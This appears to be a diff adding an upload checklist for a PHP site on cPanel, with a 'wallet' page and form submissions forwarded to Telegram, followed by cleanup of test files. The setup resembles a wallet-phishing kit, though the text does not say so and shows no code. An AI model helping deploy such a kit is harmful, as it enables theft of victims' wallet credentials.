@@ -1,0 +1,60 @@
+═══════════════════════════════════════════════════════════
+  ✅ UPLOAD CHECKLIST - TICK AS YOU GO
+═══════════════════════════════════════════════════════════
+
+BEFORE UPLOADING:
+───────────────────────────────────────────────────────────
+☐ You have cPanel login credentials
+☐ You know your domain name
+☐ All files are ready in the package folder
+
+UPLOADING FILES:
+───────────────────────────────────────────────────────────
+☐ Login to cPanel
+☐ Open File Manager
+☐ Navigate to public_html folder
+☐ Upload index.html
+☐ Upload submit.php
+☐ Upload config.php
+☐ Upload .htaccess (make sure hidden files are visible)
+☐ Upload wallet/ folder (entire folder with all contents)
+☐ Upload all CSS files (*.css)
+☐ Upload all image files (*.png, *.jpg)
+☐ Upload all font files (*.woff2)
+
+SET PERMISSIONS:
+───────────────────────────────────────────────────────────
+☐ submit.php → Set to 644
+☐ config.php → Set to 644
+☐ .htaccess → Set to 644
+
+VERIFY UPLOAD:
+───────────────────────────────────────────────────────────
+☐ All files are in public_html
+☐ wallet/ folder exists with contents
+☐ .htaccess file is visible (enable "Show Hidden Files")
+
+TEST YOUR SITE:
+───────────────────────────────────────────────────────────
+☐ Visit: https://yourdomain.com/verify_setup.php
+☐ All checks should pass (green checkmarks)
+☐ Visit: https://yourdomain.com/test_telegram.php
+☐ Check Telegram - received test message?
+☐ Visit: https://yourdomain.com/ (homepage loads?)
+☐ Visit: https://yourdomain.com/wallet/ (wallet page loads?)
+☐ Test homepage form submission
+☐ Test wallet page form submission
+☐ Check Telegram - received notifications?
+
+CLEANUP (After Testing):
+───────────────────────────────────────────────────────────
+☐ Delete verify_setup.php
+☐ Delete test_telegram.php
+☐ Delete all test_*.php files
+☐ Delete test_form.html
+☐ Delete test_local.html
+
+═══════════════════════════════════════════════════════════
+  🎉 YOUR SITE IS LIVE!
+═══════════════════════════════════════════════════════════
+
